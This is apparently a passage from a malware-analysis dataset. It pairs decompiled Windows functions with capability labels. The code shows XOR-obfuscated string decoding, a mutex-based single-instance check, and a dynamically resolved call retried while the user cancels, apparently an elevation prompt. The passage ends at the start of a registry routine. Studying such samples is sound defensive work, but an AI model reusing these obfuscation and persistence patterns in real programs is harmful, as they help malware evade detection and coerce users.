puVar1[&var_1ch - iVar17];\n    } while (iVar18 < 0x1c);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x61;\n    var_18h._1_1_ = 0x1d;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 0x57;\n    var_14h._0_1_ = 3;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 0x55;\n    var_14h._3_1_ = 0x1d;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x59;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x3f;\n    var_ch._0_1_ = 0x5f;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 0x38;\n    var_ch._3_1_ = 0x44;\n    var_8h._0_1_ = 4;\n    var_8h._1_1_ = 0x3c;\n    var_8h._2_1_ = 0x5b;\n    var_8h._3_1_ = 0x14;\n    var_4h = 0xd;\n    var_3h = 0x51;\n    var_2h = 8;\n    var_1h = 0x4a;\n    var_28h = 0x36687832;\n    var_24h._0_2_ = 0x4a6d;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar18 = 0;\n    do {\n        puVar1 = iVar18 + var_70h;\n        iVar19 = iVar18 % var_38h;\n        iVar18 = iVar18 + 1;\n        *puVar1 = *(&var_28h + iVar19) ^ puVar1[&var_18h - var_70h];\n    } while (iVar18 < 0x18);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x29;\n    var_18h._1_1_ = 0x15;\n    var_18h._2_1_ = 0x23;\n    var_18h._3_1_ = 0x15;\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_1_ = 0x1f;\n    var_14h._2_1_ = 2;\n    var_14h._3_1_ = 0x19;\n    var_10h._0_1_ = 0x17;\n    var_10h._1_1_ = 0x23;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0xf;\n    var_ch._1_1_ = 0x28;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 6;\n    var_8h._1_1_ = 3;\n    var_8h._2_1_ = 0x14;\n    var_8h._3_1_ = 0x28;\n    var_4h = 0x1d;\n    var_3h = 0x15;\n    var_2h = 0x6a;\n    var_60h = 0x786a707a;\n    var_5ch._0_1_ = 0x4d;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar19 = 0;\n    do {\n        puVar1 = iVar19 + iVar18;\n        iVar20 = iVar19 % var_34h;\n        iVar19 = iVar19 + 1;\n        *puVar1 = *(&var_60h + iVar20) ^ puVar1[&var_18h - iVar18];\n    } while (iVar19 < 0x17);\n    fcn.00407d6f();\n    var_18h._0_1_ = 0x36;\n    var_18h._1_1_ = 0x37;\n    var_18h._2_1_ = 0x3b;\n    var_18h._3_1_ = 0x24;\n    var_14h._0_1_ = 0x17;\n    var_14h._1_1_ = 4;\n    var_14h._2_1_ = 0x26;\n    var_14h._3_1_ = 0x1d;\n    var_10h._0_1_ = 0x11;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 10;\n    var_10h._3_1_ = 0x30;\n    var_ch._0_1_ = 0x19;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x17;\n    var_8h._0_1_ = 0x3b;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 0x1e;\n    var_4h = 0;\n    var_3h = 0x35;\n    var_2h = 0x1d;\n    var_1h = 0x56;\n    var_58h = 0x56785265;\n    var_54h._0_1_ = 0x72;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar19 = 0;\n    do {\n        puVar1 = iVar19 + var_60h;\n        iVar20 = iVar19 % var_34h;\n        iVar19 = iVar19 + 1;\n        *puVar1 = *(&var_58h + iVar20) ^ puVar1[&var_18h - var_60h];\n    } while (iVar19 < 0x18);\n    fcn.00407d6f();\n    var_20h = 0x420e0404;\n    var_1ch._0_1_ = 0x40;\n    var_1ch._1_1_ = 0x4a;\n    var_1ch._2_1_ = 0x23;\n    var_1ch._3_1_ = 4;\n    var_18h._0_1_ = 0x3e;\n    var_18h._1_1_ = 0x73;\n    var_18h._2_1_ = 0x47;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x33;\n    var_14h._1_1_ = 0x2c;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x5e;\n    var_10h._0_1_ = 0x74;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 0x43;\n    var_ch._2_1_ = 0x65;\n    var_ch._3_1_ = 0x4b;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x17;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 0x5c;\n    var_4h = 0x50;\n    var_3h = 0x5e;\n    var_2h = 0x32;\n    var_1h = 0x61;\n    var_28h = 0x305a6157;\n    var_24h._0_2_ = 0x3935;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar19 = 0;\n    do {\n        puVar1 = iVar19 + var_58h;\n        iVar20 = iVar19 % var_38h;\n        iVar19 = iVar19 + 1;\n        *puVar1 = *(&var_28h + iVar20) ^ puVar1[&var_20h - var_58h];\n    } while (iVar19 < 0x20);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0x32;\n    var_14h._1_1_ = 0x12;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0x3c;\n    var_10h._0_1_ = 0x3c;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x15;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0;\n    var_ch._2_1_ = 0x13;\n    var_ch._3_1_ = 0x1e;\n    var_8h._0_1_ = 0x10;\n    var_8h._1_1_ = 0x30;\n    var_8h._2_1_ = 0x3c;\n    var_8h._3_1_ = 4;\n    var_4h = 0x10;\n    var_3h = 3;\n    var_2h = 0x59;\n    var_48h = 0x59667761;\n    var_44h._0_1_ = 0x50;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar20 = 0;\n    do {\n        puVar1 = iVar20 + iVar19;\n        iVar21 = iVar20 % var_34h;\n        iVar20 = iVar20 + 1;\n        *puVar1 = *(&var_48h + iVar21) ^ puVar1[&var_14h - iVar19];\n    } while (iVar20 < 0x13);\n    fcn.00407d6f();\n    var_20h = 0x58030030;\n    var_1ch._0_1_ = 0x50;\n    var_1ch._1_1_ = 0x35;\n    var_1ch._2_1_ = 6;\n    var_1ch._3_1_ = 4;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x53;\n    var_18h._2_1_ = 100;\n    var_18h._3_1_ = 0x28;\n    var_14h._0_1_ = 0x11;\n    var_14h._1_1_ = 0xe;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x58;\n    var_10h._0_1_ = 0x54;\n    var_10h._1_1_ = 0x14;\n    var_10h._3_1_ = 0x11;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 0x44;\n    var_ch._2_1_ = 0x5a;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 10;\n    var_8h._1_1_ = 9;\n    var_8h._2_1_ = 0x2f;\n    var_8h._3_1_ = 0x51;\n    var_4h = 0x56;\n    var_3h = 0x47;\n    var_28h = 0x364a6563;\n    var_24h._0_2_ = 0x4733;\n    var_10h._2_1_ = var_1ch._2_1_;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    var_48h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar20 = 0;\n    do {\n        puVar1 = iVar20 + var_48h;\n        iVar21 = iVar20 % var_38h;\n        iVar20 = iVar20 + 1;\n        *puVar1 = *(&var_28h + iVar21) ^ puVar1[&var_20h - var_48h];\n    } while (iVar20 < 0x1e);\n    fcn.00407d6f();\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0x6d;\n    var_14h._3_1_ = 0x27;\n    var_10h._0_1_ = 3;\n    var_10h._1_1_ = 0x3d;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x56;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0xb;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 0x2b;\n    var_8h._0_1_ = 0x50;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x34;\n    var_4h = 0x3c;\n    var_3h = 0x5e;\n    var_2h = 0x2b;\n    var_1h = 0x6e;\n    var_28h = 0x4e395958;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x6e);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar20 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar21 = 0;\n    do {\n        puVar1 = iVar21 + iVar20;\n        iVar22 = iVar21 % var_34h;\n        iVar21 = iVar21 + 1;\n        *puVar1 = *(&var_28h + iVar22) ^ puVar1[&var_14h - iVar20];\n    } while (iVar21 < 0x14);\n    fcn.00407d6f();\n    var_ch._1_1_ = 6;\n    var_20h = 0x6283607;\n    var_1ch._0_1_ = 0x3c;\n    var_1ch._1_1_ = 0x2a;\n    var_1ch._2_1_ = 0x20;\n    var_1ch._3_1_ = 0x36;\n    var_18h._0_1_ = 0x38;\n    var_18h._1_1_ = 0xd;\n    var_18h._2_1_ = 0x34;\n    var_18h._3_1_ = 0x29;\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 0x3f;\n    var_14h._2_1_ = 2;\n    var_14h._3_1_ = 0x17;\n    var_10h._0_1_ = 0x15;\n    var_10h._1_1_ = 0x22;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 0x3b;\n    var_ch._2_1_ = 0x30;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 0x3d;\n    var_8h._1_1_ = 0x3f;\n    var_8h._2_1_ = 0xe;\n    var_8h._3_1_ = 0x13;\n    var_4h = 0x3c;\n    var_3h = 0x4b;\n    var_28h = 0x746b5354;\n    var_24h._0_2_ = 0x4b59;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar22 = 0;\n    do {\n        puVar1 = iVar22 + iVar21;\n        iVar23 = iVar22 % var_38h;\n        iVar22 = iVar22 + 1;\n        *puVar1 = *(&var_28h + iVar23) ^ puVar1[&var_20h - iVar21];\n    } while (iVar22 < 0x1e);\n    fcn.00407d6f();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar21);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar20);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_48h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar19);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar18);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar17);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_90h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar16);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar15);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar14);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_b0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_b8h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar13);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar12);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_c0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar11);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_40h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar10);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar9);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar8);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_50h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_68h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar7);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar6);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_98h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar24);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_a0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_a8h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar5);\n    (*pcVar2)(uVar4);\n    return;\n}\n",
        "token_count": 20010
    },
    "004047ec": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004047ec(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint *var_8ch;\n    uint *var_88h;\n    uint var_80h;\n    uint hObject;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t lpLibFileName;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint8_t var_1ch [3];\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    int32_t var_dh;\n    uint var_8h;\n    code *lpszLongPath;\n    \n    lpszLongPath = *0x41ccc0;\n    var_40h = 0x4443374d;\n    puVar9 = &lpDst;\n    for (iVar5 = 0x410; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_3ch = 0x34596833;\n    var_38h = 0x37015a20;\n    puVar9 = &ARG_0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_34h = 0x687f4446;\n    var_30h = 0x5a37346b;\n    puVar9 = &ARG_0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2ch = 0x44473711;\n    var_28h = 0x3452682e;\n    puVar9 = &lpszShortPath;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_24h = 0x375b5a29;\n    var_5ch = 6;\n    var_20h._0_1_ = 6;\n    var_20h._1_1_ = 0x44;\n    stack0xffffffdf = 0x29345468;\n    var_19h._0_1_ = 0x5a;\n    var_19h._1_1_ = 0xc;\n    var_19h._2_1_ = 0x37;\n    var_19h._3_1_ = 0x1a;\n    var_15h._0_1_ = 0x44;\n    var_15h._1_2_ = 0x683f;\n    var_15h._3_1_ = 0x4f;\n    var_11h._0_1_ = 0x34;\n    var_11h._1_1_ = 0x21;\n    var_11h._2_1_ = 0x5a;\n    var_11h._3_1_ = 0x68;\n    var_dh._0_1_ = 0x37;\n    var_50h = 0x44343768;\n    var_4ch._0_1_ = 0x5a;\n    var_20h._2_1_ = var_20h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    stack0xfffffff0 = 5;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_60h;\n        iVar6 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_50h + iVar6) ^ puVar1[&var_40h - var_60h];\n    } while (iVar5 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_60h, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_2ch = 0x737d4e47;\n    var_28h = 0x4e47390e;\n    var_24h = 0x391e7370;\n    var_20h._0_1_ = 0x13;\n    var_20h._1_1_ = 0x4e;\n    var_20h._2_1_ = 0x33;\n    stack0xffffffdf = 0x13391f73;\n    var_19h._0_1_ = 0x4e;\n    var_19h._1_1_ = 0x72;\n    var_19h._2_1_ = 0x73;\n    var_19h._3_1_ = 0x48;\n    var_15h._0_1_ = 0x39;\n    var_15h._1_2_ = 0x4e14;\n    var_15h._3_1_ = 0x70;\n    var_11h._0_1_ = 0x73;\n    var_11h._1_1_ = 0x6d;\n    var_11h._2_1_ = 0x39;\n    var_58h = 0x73524e67;\n    var_54h._0_2_ = 0x396d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    var_50h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_50h;\n        iVar6 = iVar5 % var_5ch;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_58h + iVar6) ^ puVar1[&var_2ch - var_50h];\n    } while (iVar5 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, var_50h, &lpszShortPath);\n    var_19h._1_1_ = 7;\n    var_19h._2_1_ = 0x31;\n    var_19h._3_1_ = 0x1a;\n    var_15h._0_1_ = 0x75;\n    var_15h._1_2_ = 0x753f;\n    var_15h._3_1_ = 0x50;\n    var_11h._0_1_ = 0x6f;\n    var_11h._2_1_ = 0x51;\n    var_11h._3_1_ = 0x75;\n    var_dh._0_1_ = 0x31;\n    puVar9 = &var_9ch;\n    for (iVar5 = 0x3c; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_11h._1_1_ = 6;\n    lpLibFileName = 0x756f3175;\n    var_44h._0_1_ = 0x51;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_58h = var_90h;\n    do {\n        puVar1 = iVar5 + var_90h;\n        iVar6 = iVar5 % stack0xfffffff0;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&lpLibFileName + iVar6) ^ puVar1[&var_19h + (1 - var_90h)];\n    } while (iVar5 < 0xc);\n    var_8ch = &lpDst;\n    var_9ch = 0x3c;\n    var_88h = &ARG_0;\n    var_80h = 3;\n    var_98h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_19h._1_1_ = 0x3c;\n    var_19h._2_1_ = 0x1c;\n    var_19h._3_1_ = 0x7d;\n    var_15h._0_1_ = 0xd;\n    var_15h._1_2_ = 0x782e;\n    var_15h._3_1_ = 0x5d;\n    var_11h._0_1_ = 0x7a;\n    var_11h._1_1_ = 0x5c;\n    var_11h._2_1_ = 0x2d;\n    var_11h._3_1_ = 0xe;\n    var_dh._0_1_ = 0x4b;\n    stack0xfffffff0 = 0x4138546f;\n    var_8h._0_2_ = 0x4b62;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + lpLibFileName;\n        iVar6 = iVar5 % var_5ch;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_dh + iVar6 + 1) ^ puVar1[&var_19h + (1 - lpLibFileName)];\n    } while (iVar5 < 0xc);\n    var_19h._1_1_ = 5;\n    stack0xffffffdf = stack0xffffffdf & 0xff | 0x353c3b00;\n    var_19h._0_1_ = 0x3d;\n    var_19h._2_1_ = 6;\n    var_19h._3_1_ = 0x10;\n    var_15h._0_1_ = 0x31;\n    var_15h._1_2_ = 0x2433;\n    var_15h._3_1_ = 0x1d;\n    var_11h._0_1_ = 0x26;\n    var_11h._1_1_ = 0x2d;\n    var_11h._2_1_ = 0x2c;\n    var_11h._3_1_ = 7;\n    var_dh._0_1_ = 0x51;\n    stack0xfffffff0 = 0x51505468;\n    var_8h._0_2_ = 0x4369;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = lpLibFileName;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar6;\n        iVar7 = iVar8 % var_5ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_dh + iVar7 + 1) ^ puVar1[var_1ch + -iVar6];\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    lpszLongPath = pcVar4;\n    var_94h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar8 = (*pcVar4)(&var_9ch);\n    pcVar4 = lpszLongPath;\n    while ((iVar8 == 0 && (iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar8 == 0x4c7))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        var_94h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar8 = (*pcVar4)(&var_9ch);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    uVar3 = (*pcVar2)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_58h);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_50h);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar4)(uVar3);\n    return 1;\n}\n",
        "token_count": 3278
    },
    "004057e8": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004057e8(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_40h = 0x5a1d7338;\n    var_3ch._0_2_ = 0x6b47;\n    var_8h = 5;\n    var_3ch._2_1_ = 5;\n    stack0xffffffc3 = 0x8353378;\n    var_35h = 0x705a1d73;\n    var_31h = 0x2e781d6b;\n    var_2dh = 0x1731935;\n    var_29h = 0x1c6b655a;\n    var_25h._0_2_ = 0x3378;\n    var_25h._2_1_ = 0x35;\n    var_21h = 0x615a0c73;\n    var_1dh = 0x28781b6b;\n    var_19h = 0x19730e35;\n    var_15h = 0x736b515a;\n    var_11h._0_1_ = 0x78;\n    stack0xffffffec = 0x5a78736b;\n    var_ch._0_1_ = 0x35;\n    var_25h._3_1_ = var_3ch._2_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + iVar3;\n        iVar4 = iVar5 % var_8h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_11h + iVar4 + 1) ^ puVar1[&var_40h - iVar3];\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 723
    },
    "00406d1b": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406d1b(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    int16_t *piVar10;\n    uint Reserved;\n    uint var_b4h;\n    int16_t *lpData;\n    int16_t *var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4dh;\n    uchar var_49h;\n    int32_t var_48h;\n    int32_t lpValueName;\n    int32_t hKey;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    Reserved = 1;\n    var_28h = 0x680a5a27;\n    var_24h = 0x6f3b6308;\n    var_20h = 0x5a0f6e1d;\n    var_1ch = 0x6327681b;\n    var_18h = 0x6e1b6f34;\n    var_14h = 0x680e5a17;\n    var_10h = 0x6f366302;\n    var_ch._0_2_ = 0x6e68;\n    var_3ch = 0x686f5a63;\n    var_38h._0_1_ = 0x6e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    var_ach = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 5;\n    var_b4h = 0;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_ach;\n        iVar5 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_3ch + iVar5) ^ puVar1[&var_28h - var_ach];\n    } while (iVar8 < 0x1e);\n    var_a8h = 0x34004102;\n    var_a4h = 0x6f355112;\n    var_a0h = 0x41307443;\n    var_9ch = 0x5111341d;\n    var_98h = 0x74796f1d;\n    var_94h = 0x340c4138;\n    var_48h = 6;\n    var_90h._0_1_ = 6;\n    stack0xffffff6d = 0x476f2e51;\n    var_8bh = 0x9413e74;\n    var_87h = 0x1d510034;\n    var_83h = 0x14747d6f;\n    var_7fh = 0x3f342e41;\n    var_7bh = 0x736f1d51;\n    var_77h = 0x412374;\n    var_73h = 0x31510134;\n    var_6fh = 0x3e74646f;\n    var_6bh = 0x1d340341;\n    var_67h = 0x4d6f2251;\n    var_63h = 0x3f410d74;\n    var_5fh = 0x2f511134;\n    var_5bh = 0x3874506f;\n    var_57h = 0x13340141;\n    var_53h._0_1_ = 0x51;\n    stack0xffffffab = 0x1e74646f;\n    var_4dh = 